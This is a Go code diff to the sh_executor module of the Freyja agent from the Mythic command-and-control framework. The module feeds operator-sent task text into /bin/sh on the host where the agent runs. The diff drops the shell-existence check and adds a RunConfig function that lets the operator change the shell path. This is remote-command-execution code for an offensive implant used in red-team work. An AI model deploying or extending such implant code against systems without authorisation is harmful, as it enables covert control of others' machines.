@@ -2,6 +2,7 @@ package sh_executor
 
 import (
 	"bufio"
+	"encoding/json"
 	"fmt"
 	"os"
 	"os/exec"
@@ -13,17 +14,13 @@ import (
 	"github.com/MythicAgents/freyja/Payload_Type/freyja/agent_code/pkg/utils/structs"
 )
 
+var shBin = "/bin/sh"
+
 // Run - Function that executes the sh_executor command
 func Run(task structs.Task) {
 	msg := task.NewResponse()
-	shBin := "/bin/sh"
-	if _, err := os.Stat(shBin); err != nil {
-		msg.SetError("Could not find /bin/sh")
-		task.Job.SendResponses <- msg
-		return
-	}
-
 	command := exec.Command(shBin)
+
 	command.Stdin = strings.NewReader(task.Params)
 	command.Env = os.Environ()
 
@@ -115,5 +112,26 @@ func Run(task structs.Task) {
 		task.Job.SendResponses <- msg
 		return
 	}
+	return
+}
+
+type Arguments struct {
+	Sh_executor string `json:"sh_executor"`
+}
+
+func RunConfig(task structs.Task) {
+	msg := task.NewResponse()
+	args := Arguments{}
+	err := json.Unmarshal([]byte(task.Params), &args)
+	if err != nil {
+		msg.SetError(err.Error())
+		task.Job.SendResponses <- msg
+		return
+	}
+	shBin = args.Sh_executor
+	msg.Completed = true
+	msg.UserOutput = fmt.Sprintf("Sh_executor updated")
+
+	task.Job.SendResponses <- msg
 	return
 }
